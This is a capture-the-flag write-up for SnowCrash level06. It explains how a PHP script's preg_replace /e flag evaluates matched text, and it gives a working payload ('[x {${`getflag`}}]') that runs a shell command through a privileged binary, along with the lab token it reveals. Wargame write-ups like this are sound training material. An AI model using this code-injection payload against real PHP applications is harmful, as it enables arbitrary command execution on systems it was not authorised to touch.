# level06

## Nightmare inducing PHP regex

For this level, we are met with a binary and a PHP script.
```bash
level06@SnowCrash:~$ ls
level06  level06.php
level06@SnowCrash:~$ cat level06.php
```
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
Gross. Lets make that a bit less awful to read.
```php
<?php
function y($arg1) {
    $arg1 = preg_replace("/\./", " x ", $arg1);
    $arg1 = preg_replace("/@/", " y", $arg1);
    return $arg1;
}

function x($arg1, $unused) {
    $ret = file_get_contents($arg1);
    $ret = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $ret);
    $ret = preg_replace("/\[/", "(", $ret);
    $ret = preg_replace("/\]/", ")", $ret);
    return $ret;
}

$res = x($argv[1], $argv[2]);
print $res;
?>
```
After consulting my local regex wizard ([this lad](https://github.com/acarlson99)), and reading the docs on `preg_replace`,
the point of interest is the `e` flag in the regex. 

This eval flag causes the string to be run through the PHP eval function, so if we surround something in backticks, we can
pass an arbitrary command to the shell and get its output.
```bash
level06@SnowCrash:~$ echo '[x {${`getflag`}}]' >/tmp/arg; \
> ./level06 /tmp/arg unused_argument
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$ su level07
Password: wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$ 
```
